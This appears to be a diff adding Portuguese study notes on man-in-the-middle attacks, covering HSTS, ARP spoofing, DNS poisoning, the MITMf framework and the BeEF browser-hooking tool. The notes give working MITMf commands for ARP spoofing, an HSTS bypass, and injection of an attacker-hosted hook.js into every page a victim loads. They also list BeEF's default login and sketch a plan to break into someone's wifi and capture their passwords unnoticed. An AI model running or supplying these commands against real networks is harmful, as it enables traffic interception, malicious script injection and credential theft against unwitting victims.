@@ -1,0 +1,54 @@
+HSTS: bloqueia os MitM Attack
+protege sites HTTPS, proteção contra Cookie hijacking.
+Permite que servidor web declarem só devem interagir com ele
+usando conexões HTTPS, e nunca através do protocolo HTTP inseguro ou proxy.
+
+Man in the middle - atacante que intercepta os dados
+Funciona só quando o atacante está na mesma rede(gateway) 
+que a vitima está.
+
+Man in the middle de exemplo é um ataque a rede interna.
+Dados:
+- Coletar
+- Alterar
+- Bloquear
+
+Protocolo ARP:
+Injetar pacotes  ARP na rede
+
+Comandos:
+- ifconfig eth0 192.168.1.200 netmask 255.255.255.0
+
+Servidor proxy: quando um computador serve de
+servidor proxy, quer dizer que ele é uma passagem entre os
+computadores e a internet.
+Da pra configurar que algumas portas passem pelo proxy.
+
+DNSPoisonning -Mudar o DNS da pagina:
+site: www.xvideos.com com IP dele é 8.8.8.8
+
+Man in the Middle Framework - Ferramenta
+- nmap 192.168.1.36 -Pn 
+-Pn: Não dar ping
+
+- sudo python mitmf.py --help
+- sudo python mitmf.py -i eth0 --target 192.168.1.36 --gateway 192.168.1.1  --arp --spoof
+- sudo python mitmf.py -i eth0 --target 192.168.1.36 --gateway 192.168.1.1  --arp --spoof --hsts
+--arp: utilizando o protocolo arp
+--spoof: enviando broadcast(pra toda rede), dizendo que o invasor será o novo gateway
+
+Ideias: Usar ferramenta para invadr wifi/ internet de alguem
+Depois usar o mitmf para se passar por gateway
+
+Quando acessa sites e você clica e coloca sua senha, ele captura sua senha e usuario.
+
+Software: beef (já está no kali linux)
+usuario: beef
+senha: beef
+habilitar javascript para infectar a maquina mas a vitima não pode perceber isso
+127.0.0.1:3000/hook.js
+- sudo python mitmf.py -i eth0 --target 192.168.1.36 --gateway 192.168.1.1  --arp --spoof --inject --js-url http://192.168.1.35:3000/hook.js 
+192.168.1.35: IP do atacante
+Qualquer pagina que ele abrir, ele vai injetar o js lá.
+Assim que o cara abrir qualquer site, ele vai aparecer o ip do cara no online browsers
+	-Pretty Theft
